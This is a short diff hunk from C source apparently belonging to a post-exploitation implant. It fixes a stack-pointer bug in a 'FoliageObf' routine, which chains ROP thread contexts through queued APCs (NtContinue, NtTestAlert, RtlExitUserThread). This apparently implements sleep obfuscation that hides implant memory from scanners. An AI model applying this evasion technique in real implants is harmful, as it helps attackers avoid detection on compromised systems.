@@ -212,7 +212,7 @@ VOID FoliageObf(
                     RopExitThd->Rip  = U_PTR( Instance->Win32.RtlExitUserThread );
                     RopExitThd->Rsp -= U_PTR( 0x1000 * 4 );
                     RopExitThd->Rcx  = U_PTR( ERROR_SUCCESS );
-                    *( PVOID* )( RopBegin->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
+                    *( PVOID* )( RopExitThd->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                     // RtlExitUserThread( ERROR_SUCCESS );
 
                     if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopBegin,    FALSE, NULL ) ) ) goto Leave;
